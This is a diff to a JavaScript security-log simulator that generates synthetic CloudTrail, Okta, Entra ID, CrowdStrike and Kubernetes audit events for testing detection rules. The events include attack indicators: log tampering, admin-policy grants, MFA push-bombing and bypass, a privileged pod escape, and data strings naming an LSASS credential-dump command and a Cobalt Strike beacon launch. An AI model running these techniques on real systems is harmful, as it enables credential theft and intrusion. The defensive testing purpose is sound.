+          message: `ssl ${victim} -> ${c2}:443 TLSv12 ja3=a0e9f5d64349fb13191bc781f81f42e1`,
+        }));
+        return evs;
+      },
+    },
+    cloudtrail: {
+      // AWS emits no syslog: CloudTrail records land in S3 / EventBridge and a
+      // connector re-emits them, so this source declares transport 'api'.
+      label: 'AWS CloudTrail', category: 'appliance', transport: 'api',
+      build() {
+        const user = rand.pick(['jdoe', 'asmith', 'svc_deploy', 'mchen']);
+        const region = rand.pick(['us-east-1', 'eu-west-1', 'ap-southeast-2']);
+        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${user}`;
+        const evs = [];
+        const benign = [
+          ['ec2.amazonaws.com', 'DescribeInstances'], ['s3.amazonaws.com', 'ListBuckets'],
+          ['sts.amazonaws.com', 'GetCallerIdentity'], ['logs.amazonaws.com', 'DescribeLogGroups'],
+        ];
+        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
+          const call = rand.pick(benign);
+          evs.push(aws({ severity: 6, region, user, arn, readOnly: true, srcIp: rand.internalIp(),
+            eventSource: call[0], eventName: call[1],
+            message: `${call[1]} on ${call[0]} by ${user} (success)` }));
+        }
+        // One control-plane abuse closes the burst, so cloud-threat alerts once.
+        const bad = rand.pick([
+          () => ({ eventSource: 'cloudtrail.amazonaws.com', eventName: 'StopLogging',
+            requestParameters: { name: `arn:aws:cloudtrail:${region}:${AWS_ACCOUNT}:trail/org-audit-trail` },
+            message: `StopLogging on org-audit-trail by ${user}` }),
+          () => ({ eventName: 'CreateAccessKey', requestParameters: { userName: 'backup-svc' },
+            responseElements: { accessKey: { accessKeyId: `AKIA${rand.hex(16).toUpperCase()}`, userName: 'backup-svc', status: 'Active' } },
+            message: `CreateAccessKey for backup-svc by ${user}` }),
+          () => ({ eventSource: 's3.amazonaws.com', eventName: 'PutBucketAcl',
+            requestParameters: { bucketName: 'corp-finance-reports', 'x-amz-acl': 'public-read',
+              AccessControlPolicy: { Grantee: 'http://acs.amazonaws.com/groups/global/AllUsers', Permission: 'READ' } },
+            message: `PutBucketAcl public-read on corp-finance-reports by ${user}` }),
+          () => ({ eventName: 'AttachUserPolicy',
+            requestParameters: { userName: 'backup-svc', policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess' },
+            message: `AttachUserPolicy AdministratorAccess to backup-svc by ${user}` }),
+        ])();
+        evs.push(aws(Object.assign({ severity: 3, region, user, arn, srcIp: rand.pick(THREAT_INTEL.ips) }, bad)));
+        return evs;
+      },
+    },
+    okta: {
+      // Okta ships nothing over syslog — the System Log is polled from
+      // /api/v1/logs by a connector, so this source declares transport 'api'.
+      label: 'Okta System Log', category: 'appliance', transport: 'api',
+      build() {
+        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
+        const name = who.split('@')[0];
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          const t = rand.pick(['user.session.start', 'app.oauth2.as.consent.grant', 'user.authentication.sso']);
+          evs.push(Object.assign(idp({ user: who, displayName: name, oktaEventType: t,
+            displayMessage: t === 'user.session.start' ? 'User login to Okta' : 'User single sign on to app',
+            srcIp: rand.ip(), oktaTarget: [{ id: `0oa${rand.id()}`, type: 'AppInstance', displayName: rand.pick(['Salesforce', 'Workday', 'AWS SSO']) }],
+            message: `${t} SUCCESS ${who} from ${GEO.sydney.city}/${GEO.sydney.country}` }), GEO.sydney));
+        }
+        // Push-bombing burst against one account — no signature to match, so the
+        // mfa-fatigue rule counts the rejections and alerts once.
+        const a = rand.pick(THREAT_INTEL.ips), geo = rand.pick([GEO.moscow, GEO.lagos, GEO.shenzhen]);
+        for (let i = 0, n = rand.int(7, 10); i < n; i++) {
+          evs.push(Object.assign(idp({ user: who, displayName: name, severity: 4, oktaSeverity: 'WARN',
+            oktaEventType: 'user.authentication.auth_via_mfa', factor: 'push', credType: 'OTP',
+            outcome: 'FAILURE', outcomeReason: 'FAILED_PUSH_VERIFY_REJECTED', srcIp: a, isProxy: true,
+            displayMessage: 'Authentication of user via MFA',
+            message: `user.authentication.auth_via_mfa FAILURE push rejected ${who} from ${geo.city}/${geo.country}` }), geo));
+        }
+        return evs;
+      },
+    },
+    entra: {
+      // Entra ID sign-in logs leave the tenant through Graph or an Event Hub —
+      // there is no syslog listener, so this source declares transport 'api'.
+      label: 'Microsoft Entra ID', category: 'appliance', transport: 'api',
+      build() {
+        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
+        const base = () => ({
+          srcType: 'entra', vendor: 'entra', host: 'entra-connector-01', facility: FACILITY.local6,
+          program: 'entra_signin', severity: 6, tenantId: ENTRA_TENANT, eventUuid: rand.uuid(),
+          actorId: rand.uuid(), user: who, displayName: who.split('@')[0],
+          clientOs: 'Windows 10', browser: 'Edge 126.0.0', errorCode: 0, resultDescription: null,
+          caStatus: 'success', riskLevel: 'none', riskDetail: 'none', riskState: 'none',
+          authRequirement: 'multiFactorAuthentication', compliant: true,
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            appName: rand.pick(['Office 365 Exchange Online', 'Microsoft Teams', 'Azure Portal']),
+            appId: rand.uuid(), clientApp: 'Browser', srcIp: rand.ip(),
+            city: 'Sydney', countryCode: 'AU', lat: -33.86, lon: 151.21,
+            message: `Sign-in SUCCESS ${who} via Browser from Sydney/AU (CA success, MFA satisfied)`,
+          }));
+        }
+        // Legacy protocols predate modern auth: they cannot do MFA and Conditional
+        // Access reports notApplied. A success here is an MFA bypass.
+        const a = rand.pick(THREAT_INTEL.ips);
+        evs.push(Object.assign(base(), {
+          severity: 4, appName: 'Office 365 Exchange Online', appId: rand.uuid(),
+          clientApp: rand.pick(['IMAP4', 'POP3', 'SMTP Auth', 'Other clients']),
+          srcIp: a, interactive: false, compliant: false,
+          caStatus: 'notApplied', riskLevel: 'high', riskDetail: 'unfamiliarFeatures', riskState: 'atRisk',
+          authRequirement: 'singleFactorAuthentication',
+          city: 'Moscow', countryCode: 'RU', lat: 55.75, lon: 37.61,
+          message: `Sign-in SUCCESS ${who} via legacy client from Moscow/RU (CA notApplied, single-factor)`,
+        }));
+        return evs;
+      },
+    },
+    crowdstrike: {
+      // Falcon detections are read from the Event Streams API by the SIEM
+      // connector — nothing reaches a collector on its own, hence 'api'.
+      label: 'CrowdStrike Falcon', category: 'appliance', transport: 'api',
+      build() {
+        const h = rand.pick(HOSTS.windows);
+        const sensorId = rand.hex(32);
+        let offset = rand.int(1000000, 9000000);
+        const base = () => ({
+          srcType: 'crowdstrike', vendor: 'crowdstrike', host: h.name, hostIp: h.ip,
+          facility: FACILITY.local5, program: 'falcon_siem', customerId: rand.hex(32),
+          sensorId, offset: offset++, user: rand.pick(USERS),
+        });
+        const evs = [];
+        // An EDR emits verdicts, not raw telemetry — the quiet ones are still
+        // detections, just low severity and already handled.
+        const low = [
+          ['NGAV', 'Suspicious Activity', 'choice.exe', 'choice /m sample_detection', 'Machine Learning', 'Sensor-based ML', 2, 'Low'],
+          ['PUP', 'Potentially Unwanted Program', 'toolbar_setup.exe', 'toolbar_setup.exe /S', 'Malware', 'Adware', 3, 'Medium'],
+        ];
+        for (const l of low) {
+          evs.push(Object.assign(base(), {
+            severity: 5, detectName: l[1], detectDesc: `${l[1]} detected on ${h.name}`,
+            fileName: l[2], filePath: '\\Device\\HarddiskVolume2\\Users\\Public',
+            cmdLine: l[3], csTactic: l[4], csTechnique: l[5], csObjective: 'Falcon Detection Method',
+            csSeverity: l[6], csSeverityName: l[7], sha256: rand.hex(64),
+            parentImage: '\\Device\\HarddiskVolume2\\Windows\\explorer.exe',
+            disposition: 'Prevention, process blocked.',
+            message: `${l[1]} — ${l[2]} (${l[7]})`,
+          }));
+        }
+        // An EDR reports a verdict, and `message` carries only that verdict — the
+        // raw command line stays in the JSON where it belongs. Keeping the two
+        // apart is what stops the behavioural rules re-detecting a finding the
+        // sensor has already made and blocked.
+        const det = rand.pick([
+          ['Credential Theft', 'Credential Access', 'OS Credential Dumping', 'rundll32.exe',
+            'rundll32.exe comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\out.dmp full'],
+          ['Malicious File Blocked', 'Impact', 'Data Encrypted for Impact', 'encryptor.exe',
+            'encryptor.exe --path \\\\fileserver\\share --threads 8'],
+          ['Cobalt Strike Beacon', 'Command and Control', 'Application Layer Protocol', 'rundll32.exe',
+            'rundll32.exe C:\\ProgramData\\beacon.dll,Start'],
+        ]);
+        evs.push(Object.assign(base(), {
+          severity: 2, detectName: det[0], detectDesc: `${det[0]} blocked on ${h.name}`,
+          fileName: det[3], filePath: '\\Device\\HarddiskVolume2\\Windows\\System32',
+          cmdLine: det[4], csTactic: det[1], csTechnique: det[2], csObjective: 'Falcon Detection Method',
+          csSeverity: 9, csSeverityName: 'Critical', sha256: rand.hex(64),
+          parentImage: '\\Device\\HarddiskVolume2\\Windows\\System32\\cmd.exe',
+          disposition: 'Prevention, process killed.',
+          threatSig: `${det[0]} (${det[2]})`, threatSev: 'critical',
+          message: `${det[0]} — ${det[3]} killed (Critical)`,
+        }));
+        return evs;
+      },
+    },
+    k8saudit: {
+      // The API server writes audit events to a file or webhook; a collector
+      // reads them. Nothing speaks syslog, so this source declares 'api'.
+      label: 'Kubernetes audit', category: 'appliance', transport: 'api',
+      build() {
+        const base = () => ({
+          srcType: 'k8saudit', vendor: 'k8saudit', host: 'k8s-apiserver-01', hostIp: '10.20.0.10',
+          facility: FACILITY.local6, program: 'kube-apiserver', severity: 6,
+          eventUuid: rand.uuid(), status: 200, rbacDecision: 'allow',
+          userAgent: rand.pick(['kubectl/v1.30.2', 'argocd-application-controller/v2.11']),
+        });
+        const evs = [];
+        const ns = rand.pick(['production', 'payments', 'default']);
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          const verb = rand.pick(['get', 'list', 'watch']);
+          evs.push(Object.assign(base(), {
+            verb, k8sResource: rand.pick(['pods', 'services', 'configmaps']), namespace: ns,
+            objectName: `app-${rand.id().slice(0, 5)}`, srcIp: rand.internalIp(),
+            user: 'system:serviceaccount:argocd:argocd-application-controller',
+            auditLevel: 'Metadata', requestUri: `/api/v1/namespaces/${ns}/pods`,
+            message: `${verb} pods in ${ns} — allowed`,
+          }));
+        }
+        // A privileged pod with the host filesystem mounted is a container escape
+        // in one manifest. k8s-threat alerts once.
+        const a = rand.pick(THREAT_INTEL.ips);
+        evs.push(Object.assign(base(), {
+          severity: 3, verb: 'create', k8sResource: 'pods', namespace: ns, objectName: 'debug-shell',
+          srcIp: a, user: 'system:anonymous', groups: ['system:unauthenticated'],
+          userAgent: 'kubectl/v1.30.2', status: 201, privileged: true,
+          requestUri: `/api/v1/namespaces/${ns}/pods`,
+          rbacReason: 'RBAC: allowed by ClusterRoleBinding "cluster-admin-binding"',
+          message: `create pods/debug-shell in ${ns} — privileged:true hostPID:true hostPath:/ mounted, by system:anonymous`,
+        }));
+        evs.push(Object.assign(base(), {
+          severity: 3, verb: 'create', k8sResource: 'pods/exec', namespace: ns, objectName: 'debug-shell',
+          srcIp: a, user: 'system:anonymous', groups: ['system:unauthenticated'], status: 101,
+          requestUri: `/api/v1/namespaces/${ns}/pods/debug-shell/exec?command=%2Fbin%2Fsh&stdin=true&tty=true`,
+          message: `create pods/exec into debug-shell in ${ns} — /bin/sh, by system:anonymous`,
+        }));
+        return evs;
+      },
+    },
     cef: {
       label: 'CEF (generic)', category: 'appliance',
       build() {
@@ -1089,6 +2373,12 @@
       this.collectorIp = '10.0.0.100';
       this.collectorPort = 514;
       this.onStop = null;           // callback(reason) when auto-stopped
+      // Appliance-only stream: while any appliance sources are selected the
+      // continuous stream emits from those sources instead of the generic
+      // baseline mix, so picking "Cisco ASA" yields Cisco ASA logs and nothing else.
+      this.applianceSources = [];
+      this._applianceQueue = [];
+      this._lastFullBurst = 0;
       // File replay
       this.fileLines = [];
       this.fileName = null;
@@ -1112,7 +2402,12 @@
     setFileMode(b) { this.fileMode = !!b; }
     setLoop(b) { this.loop = !!b; }
     loadFile(lines, name) { this.fileLines = lines || []; this.fileName = name || null; this._filePtr = 0; }
-    resetCounters() { this.emitted = 0; this._filePtr = 0; this.forwardedCount = 0; }
+    resetCounters() { this.emitted = 0; this._filePtr = 0; this.forwardedCount = 0; this._applianceQueue.length = 0; }
+    // Restrict the live stream to the given appliance ids ([] = generic baseline mix).
+    setApplianceSources(ids) {
+      this.applianceSources = (ids || []).filter((id) => SCENARIOS[id] && SCENARIOS[id].category === 'appliance');
+      this._applianceQueue.length = 0;
+    }
     setForwarding(b) { this.forwarding = !!b; if (!b) this._fwdQueue.length = 0; else this.forwardError = null; }
     setForwardProto(p) { this.forwardProto = p; }
 
@@ -1179,8 +2474,29 @@
     }
 
     _emitBaseline() {
+      if (this.applianceSources.length) { this._emitAppliance(); return; }
       const src = weightedSource();
       this._finalize(BASELINE[src]());
+    }
+
+    // Drip the selected appliances' bursts out one event per slot so the stream
+    // honours the EPS setting instead of dumping a whole burst per tick.
+    _emitAppliance() {
+      if (!this._applianceQueue.length) {
+        const scenario = SCENARIOS[rand.pick(this.applianceSources)];
+        if (!scenario) return;
+        const burst = scenario.build();
+        // Appliance builders emit routine traffic first and append the notable
+        // events last, so streaming the front of a burst reads like the live
+        // device. Let a whole burst — detections and all — through every ~30s,
+        // otherwise a sustained feed would flood Detections with one alert per burst.
+        const now = Date.now();
+        const whole = now - this._lastFullBurst >= 30000;
+        if (whole) this._lastFullBurst = now;
+        this._applianceQueue = whole ? burst : burst.slice(0, Math.ceil(burst.length / 3));
+      }
+      const partial = this._applianceQueue.shift();
+      if (partial) this._finalize(partial);
     }
 
     _emitFileLine() {
